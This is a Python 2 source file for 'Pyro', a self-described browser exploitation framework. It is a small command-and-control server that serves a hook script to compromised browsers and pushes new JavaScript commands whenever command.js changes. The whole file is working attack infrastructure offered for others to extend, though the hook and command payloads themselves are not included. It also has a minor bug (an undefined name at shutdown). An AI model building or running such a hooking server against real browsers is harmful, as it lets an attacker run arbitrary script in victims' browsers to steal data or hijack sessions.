#!/usr/bin/python
"""
Pyro The Python Browser Exploitation Framework

This is meant to be the simplest form of hooking server ever.
And it is left to the reader to extend the frame work or you
could wait for me to make it awesome.
Author: k3170makan

The client will request a new command.js from the server periodically
once a new command.js file is available it will respond with a 200 OK
and serve the file to run in the hooked browser.

The Server determines the "newness" of a command.js file by checking
the md5 hash to see if it changed
"""
import time
import BaseHTTPServer
import md5 #need to check the md5 of the command file
HOST_NAME="127.0.0.1" #set this to the hostname of your server
PORT_NUMBER=8080 #choose a port
class Pyro(BaseHTTPServer.BaseHTTPRequestHandler):
	current_md5=md5.new(open("command.js").read()).digest()
	SERVER_PATH="/media/cerebro/SecRes/Pyro/tests"#make sure there are no trailing '/'s
	def do_GET(s):
		reqPath=s.path.split("/")[1:]
		if reqPath[len(reqPath)-1]=="command.js":
			s.getCommand() #handles issuing of new commands
		elif reqPath[len(reqPath)-1]=="hook.js":
			s.getHook() #handles supplying hook script
		elif reqPath[len(reqPath)-1]=="hooktest.html":
			s.getFile(Pyro.SERVER_PATH+s.path)
	def getFile(s,filename):
		try:
			with open(filename,"r") as f:
				s.send_response(200)
				s.send_header("Content-Type","text/html")
				s.end_headers()
				for line in f.readlines():
					s.wfile.write(line)
		except IOError:
			s.send_response(404)
	def getCommand(s):
		if s.hasCommandHash(): #we have a new command
			Pyro.current_md5=md5.new(open("command.js").read()).digest()
			try:
				with open("command.js") as f: #check that this file can actually be served
					s.send_response(200)
					s.send_header("Content-Type","application/javascript")
					s.end_headers()
					for line in f.readlines():
						s.wfile.write(line)
			except IOError:
				s.send_response(404)
				s.end_headers()
		else:
			s.send_response(404) #you can add your own response here, I'm just keeping it simple
			s.end_headers()
	def getHook(s):
		try:
			with open("hook.js") as f:#check whether the hook is available
				s.send_response(200)
				s.send_header("Content-type","application/javascript")
				s.end_headers()
				for line in f.readlines():
					s.wfile.write(line)	 
		except IOError:
			s.send_response(404)
			s.end_headers()
	def hasCommandHash(s):
		return Pyro.current_md5!=md5.new(open("command.js").read()).digest()
if __name__=="__main__":
	server_obj=BaseHTTPServer.HTTPServer
	httpd = server_obj((HOST_NAME,PORT_NUMBER),Pyro)
	print time.asctime(),"Server Starts - %s:%s" % (HOST_NAME,PORT_NUMBER)
	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		pass
	http.server_close()
	print time.asctime()
